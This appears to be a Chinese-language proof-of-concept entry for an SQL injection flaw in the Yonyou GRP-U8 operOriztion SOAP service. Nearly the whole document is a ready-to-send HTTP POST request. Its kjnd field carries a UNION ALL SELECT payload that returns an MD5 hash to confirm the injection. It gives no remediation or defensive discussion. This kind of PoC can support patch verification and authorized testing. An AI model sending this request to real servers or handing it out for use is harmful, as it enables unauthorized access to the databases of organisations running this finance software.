## 用友GRP-U8-operOriztion存在SQL注入漏洞


## poc
```
POST /services/operOriztion HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/>
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))-- </kjnd>
</wsdd:getGsbmfaByKjnd>
</soapenv:Body>
</soapenv:Envelope>
```
